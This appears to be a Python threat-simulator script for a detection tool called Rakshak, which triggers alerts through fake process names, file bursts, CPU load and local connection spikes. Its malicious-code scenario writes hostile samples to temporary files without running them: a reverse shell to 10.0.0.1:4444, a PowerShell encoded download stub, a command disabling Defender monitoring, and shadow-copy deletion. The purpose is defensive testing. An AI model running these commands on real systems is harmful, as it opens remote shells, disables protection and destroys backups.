"""
RAKSHAK - Advanced Threat Simulator
Exercises all detection engines with realistic attack simulations.

Scenarios:
  1. Suspicious process name (anomaly sensor - name-based)
  2. Rapid file creation (anomaly sensor - filesystem)
  3. CPU abuse (behavioral detector - CPU spike)
  4. Malicious code drop (code scanner - pattern match)
  5. Network beacon simulation (behavioral detector - connection spike)

Usage:
    python -m sentinel.mock_threat
    python -m sentinel.mock_threat --scenario cpu
    python -m sentinel.mock_threat --all
"""

import os
import sys
import time
import tempfile
import shutil
import subprocess
import argparse
import threading
import multiprocessing


TEMP_DIR = os.path.join(tempfile.gettempdir(), "rakshak_test")


def _banner():
    print("=" * 55)
    print("  RAKSHAK - Advanced Threat Simulation")
    print("=" * 55)
    print()


def _ensure_dir():
    os.makedirs(TEMP_DIR, exist_ok=True)
    return TEMP_DIR


# ---------------------------------------------------------------------------
# Scenario 1: Suspicious process name (triggers anomaly_sensor name check)
# ---------------------------------------------------------------------------
def scenario_suspicious_process():
    """Launch a process with a name matching known malware patterns."""
    print("[SIM 1] Suspicious Process Name")
    print("  Triggers: Anomaly Sensor (name-based detection)")
    print()

    script_path = os.path.join(_ensure_dir(), "fake_malware_dropper.py")
    with open(script_path, "w") as f:
        f.write(
            "import time, os\n"
            "print(f'[SIM] fake_malware_dropper running as PID {os.getpid()}')\n"
            "print('[SIM] Simulating malicious activity...')\n"
            "time.sleep(20)\n"
            "print('[SIM] Exiting.')\n"
        )

    print(f"  Launching: {script_path}")
    proc = subprocess.Popen(
        [sys.executable, script_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    print(f"  PID: {proc.pid}")
    print(f"  Expected: HIGH severity alert on 'fake_malware_dropper'")
    return proc, script_path


# ---------------------------------------------------------------------------
# Scenario 2: Rapid file creation (triggers anomaly_sensor filesystem)
# ---------------------------------------------------------------------------
def scenario_file_burst(count: int = 50):
    """Create many files quickly to simulate ransomware encryption."""
    print(f"[SIM 2] Rapid File Creation ({count} files)")
    print("  Triggers: Anomaly Sensor (filesystem burst detection)")
    print()

    burst_dir = os.path.join(_ensure_dir(), "ransomware_sim")
    os.makedirs(burst_dir, exist_ok=True)

    # Note: The anomaly sensor watches TEMP by default.
    # We create files directly in TEMP so the DirectoryWatcher picks them up.
    temp = os.environ.get("TEMP", os.environ.get("TMP", "/tmp"))
    print(f"  Creating {count} '.encrypted' files in {temp}")

    for i in range(count):
        fpath = os.path.join(temp, f"eg_sim_encrypted_{i:04d}.locked")
        with open(fpath, "w") as f:
            f.write(f"SIMULATED_RANSOMWARE_PAYLOAD_{i}\n" * 10)

    print(f"  Expected: HIGH severity 'Rapid file creation spike'")
    return [os.path.join(temp, f"eg_sim_encrypted_{i:04d}.locked") for i in range(count)]


# ---------------------------------------------------------------------------
# Scenario 3: CPU abuse (triggers behavioral detector CPU spike)
# ---------------------------------------------------------------------------
def scenario_cpu_spike(duration: int = 25):
    """
    Spawn a worker that burns CPU. Named 'cryptominer_sim' so it's
    NOT in the trusted process list and will trigger behavioral detection.
    """
    print(f"[SIM 3] CPU Abuse ({duration}s)")
    print("  Triggers: Behavioral Detector (CPU z-score spike)")
    print("            Anomaly Sensor (sustained CPU > 95%)")
    print()

    script_path = os.path.join(_ensure_dir(), "cryptominer_sim.py")
    with open(script_path, "w") as f:
        f.write(
            "import time, os, sys\n"
            f"deadline = time.time() + {duration}\n"
            "print(f'[SIM] CPU abuse started, PID={os.getpid()}')\n"
            "x = 0\n"
            "while time.time() < deadline:\n"
            "    x += 1  # tight loop burns CPU\n"
            "print('[SIM] CPU abuse finished.')\n"
        )

    proc = subprocess.Popen(
        [sys.executable, script_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    print(f"  PID: {proc.pid}  (will run for {duration}s)")
    print(f"  Expected: MEDIUM+ severity CPU spike after baseline establishes")
    return proc, script_path


# ---------------------------------------------------------------------------
# Scenario 4: Malicious code drop (triggers code scanner)
# ---------------------------------------------------------------------------
def scenario_malicious_code():
    """
    Write files containing patterns that the code scanner should catch:
    reverse shells, hardcoded credentials, encoded commands, etc.
    """
    print("[SIM 4] Malicious Code Drop")
    print("  Triggers: Code Scanner (pattern-based detection)")
    print()

    code_dir = _ensure_dir()

    # File 1: Reverse shell pattern
    revshell_path = os.path.join(code_dir, "backdoor.py")
    with open(revshell_path, "w") as f:
        f.write(
            'import socket\n'
            's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
            's.connect( ("10.0.0.1", 4444) )\n'
            'import subprocess\n'
            'subprocess.call(["/bin/sh", "-i"])\n'
        )

    # File 2: Hardcoded credentials
    creds_path = os.path.join(code_dir, "config_leak.py")
    with open(creds_path, "w") as f:
        f.write(
            'DB_HOST = "prod-db.internal"\n'
            'password = "SuperSecretP@ssw0rd123"\n'
            'api_key = "sk-abcdefghijklmnopqrstuvwxyz1234567890"\n'
        )

    # File 3: PowerShell encoded command
    ps_path = os.path.join(code_dir, "payload.ps1")
    with open(ps_path, "w") as f:
        f.write(
            '# Simulated encoded command execution\n'
            'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n'
            'Set-MpPreference -DisableRealtimeMonitoring $true\n'
        )

    # File 4: Shadow copy deletion + command injection
    ransom_path = os.path.join(code_dir, "wiper.bat")
    with open(ransom_path, "w") as f:
        f.write(
            '@echo off\n'
            'vssadmin delete shadows /all /quiet\n'
            'echo All shadows deleted\n'
        )

    files = [revshell_path, creds_path, ps_path, ransom_path]
    print(f"  Dropped {len(files)} malicious files in {code_dir}")
    for fp in files:
        print(f"    - {os.path.basename(fp)}")
    print(f"  Expected: CRITICAL/HIGH alerts for reverse_shell, credentials, encoded_command, shadow_copy")
    return files


# ---------------------------------------------------------------------------
# Scenario 5: Network beacon simulation
# ---------------------------------------------------------------------------
def scenario_network_beacon(duration: int = 20):
    """
    Open many connections (localhost) to simulate C2 beacon behavior.
    Triggers behavioral detector network connection spike.
    """
    print(f"[SIM 5] Network Beacon ({duration}s)")
    print("  Triggers: Behavioral Detector (network connection spike)")
    print()

    script_path = os.path.join(_ensure_dir(), "beacon_sim.py")
    with open(script_path, "w") as f:
        f.write(
            "import socket, time, os\n"
            "print(f'[SIM] Network beacon started, PID={os.getpid()}')\n"
            "sockets = []\n"
            "for i in range(30):\n"
            "    try:\n"
            "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "        s.settimeout(0.5)\n"
            "        try:\n"
            "            s.connect(('127.0.0.1', 65000 + i))\n"
            "        except (ConnectionRefusedError, OSError):\n"
            "            pass\n"
            "        sockets.append(s)\n"
            "    except Exception:\n"
            "        pass\n"
            f"time.sleep({duration})\n"
            "for s in sockets:\n"
            "    try: s.close()\n"
            "    except: pass\n"
            "print('[SIM] Beacon finished.')\n"
        )

    proc = subprocess.Popen(
        [sys.executable, script_path],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    print(f"  PID: {proc.pid}")
    print(f"  Expected: MEDIUM severity network connection spike")
    return proc, script_path


# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
def cleanup(files=None, procs=None):
    """Remove all simulation artifacts."""
    print()
    print("[SIM] Cleaning up...")

    if procs:
        for proc in procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                pass

    # Remove temp files from burst scenario
    temp = os.environ.get("TEMP", os.environ.get("TMP", "/tmp"))
    for f in os.listdir(temp):
        if f.startswith("eg_sim_encrypted_"):
            try:
                os.remove(os.path.join(temp, f))
            except OSError:
                pass

    # Remove test directory
    if os.path.exists(TEMP_DIR):
        shutil.rmtree(TEMP_DIR, ignore_errors=True)

    print("[SIM] Cleanup complete.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Rakshak Threat Simulator")
    parser.add_argument(
        "--scenario",
        choices=["process", "files", "cpu", "code", "network", "all"],
        default="all",
        help="Which scenario to run (default: all)",
    )
    parser.add_argument("--no-cleanup", action="store_true",
                        help="Skip cleanup (leave artifacts for manual inspection)")
    args = parser.parse_args()

    _banner()

    print("Make sure the sentinel backend is running:")
    print("  python -m sentinel.server")
    print()
    input("Press ENTER to start the simulation...")
    print()

    procs = []
    files = []
    scripts = []

    try:
        if args.scenario in ("process", "all"):
            proc, script = scenario_suspicious_process()
            procs.append(proc)
            scripts.append(script)
            print()
            time.sleep(2)

        if args.scenario in ("files", "all"):
            burst_files = scenario_file_burst(50)
            files.extend(burst_files)
            print()
            time.sleep(2)

        if args.scenario in ("cpu", "all"):
            proc, script = scenario_cpu_spike(25)
            procs.append(proc)
            scripts.append(script)
            print()
            time.sleep(2)

        if args.scenario in ("code", "all"):
            code_files = scenario_malicious_code()
            files.extend(code_files)
            print()
            time.sleep(2)

        if args.scenario in ("network", "all"):
            proc, script = scenario_network_beacon(20)
            procs.append(proc)
            scripts.append(script)
            print()

        wait_time = 30 if args.scenario == "all" else 15
        print(f"[SIM] Simulation running. Waiting {wait_time}s for detection...")
        print(f"[SIM] Check the dashboard for alerts!")
        print()

        # Wait for processes to finish
        for proc in procs:
            try:
                proc.wait(timeout=wait_time)
            except subprocess.TimeoutExpired:
                pass

    except KeyboardInterrupt:
        print("\n[SIM] Interrupted.")

    finally:
        if not args.no_cleanup:
            cleanup(files=files, procs=procs)
        else:
            print("\n[SIM] Skipping cleanup (--no-cleanup). Artifacts remain in", TEMP_DIR)

    print()
    print("[SIM] Simulation complete!")
    print("[SIM] Expected alerts per scenario:")
    print("  1. Suspicious process  -> Anomaly Sensor     -> HIGH")
    print("  2. File burst          -> Anomaly Sensor     -> HIGH")
    print("  3. CPU abuse           -> Behavioral + Sensor -> MEDIUM+")
    print("  4. Malicious code drop -> Code Scanner       -> CRITICAL/HIGH")
    print("  5. Network beacon      -> Behavioral         -> MEDIUM")


if __name__ == "__main__":
    main()
